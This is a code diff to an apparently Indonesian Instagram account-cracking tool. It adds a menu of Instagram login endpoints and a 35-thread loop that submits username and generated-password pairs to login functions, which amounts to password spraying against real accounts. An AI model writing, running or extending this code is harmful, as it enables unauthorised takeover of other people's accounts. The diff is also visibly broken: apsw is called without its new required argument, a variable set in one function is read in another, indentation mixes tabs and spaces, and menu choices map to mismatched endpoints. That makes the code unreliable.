@@ -480,19 +480,24 @@ def Find_MediaId(link,cokie):
         else:ahmasa.append(idr[0].split('_')[0])
     return ahmasa
 
-def crack():
+def cccrack():
 	apsw()
 	
-def ccrack():
-    print('\n')
-    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Crack Menggunakan Methode i.instagram.com
+def crack():
+	print('\n')
+	console.print(Panel(f"""{P2}[{color_text}01{P2}]. Crack Menggunakan Methode i.instagram.com
 {P2}[{color_text}02{P2}]. Crack Menggunakan Methode www.instagram.com
-{P2}[{color_text}03{P2}]. Crack Menggunakan Methode api.instagram.com
-{P2}[{color_text}04{P2}]. Crack Menggunakan Methode Threads""",width=60, title="METHOD", style=f"{color_panel}"))
-    method = Console().input(f" {H2}• {P2}Masukan : ")
-    apsw(method)
+{P2}[{color_text}03{P2}]. Crack Menggunakan Methode api.instagram.com""",width=60, title="METHOD", style=f"{color_panel}"))
+	method = Console().input(f" {H2}• {P2}Masukan : ")
+	if method in ['01','1']: SistemLog = "api"
+	elif method in ['02','2']: SistemLog = "ini"
+	elif method in ['03','3']: SistemLog = "www"
+	elif method in ['04','4']: SistemLog = "bi"
+	else:SistemLog = "api.instagram.com"
+	apsw()
 
-def apsw():
+	
+def apsw(method):
     global iniapabree, kaloinijugaapa
     console.print(f'\n {H2}• {P2}Tambah Password Sendiri? (y/t)')
     weskas = console.input(f' {H2}• {P2}Masukan : ').lower()
@@ -515,11 +520,20 @@ def apsw():
     iniapabree = Progress(TextColumn('{task.description}'))
     kaloinijugaapa = iniapabree.add_task('',total=len(fanids))
     with iniapabree:
-       with ThreadPoolExec(max_workers=35) as pikha:
+       with ThreadPoolExec(max_workers=35) as fannjha:
           for i in fanids:
              username, password = i.split('<<=>>')
-             apacobabg = generate(password.lower())
-             pikha.submit(iniygdipake, username,apacobabg)
+             password = generate(password.lower())
+             if SistemLog == "api":
+		     fannjha.submit(api_insta, username, password)
+	     elif SistemLog == "ini":
+		     fannjha.submit(i_insta, username, password)
+	     elif SistemLog == "www":
+		     fannjha.submit(www_insta, username, password)
+	     elif SistemLog == "bi":
+		     fannjha.submit(threads, username, password)
+	     else:
+		     fannjha.submit(api_insta, username, password)
     if success == 0 and checkpoint == 0:
        console.print(f' {H2}• {P2}Maaf Bree Kamu Gk Dapat Hasil')
        exit()
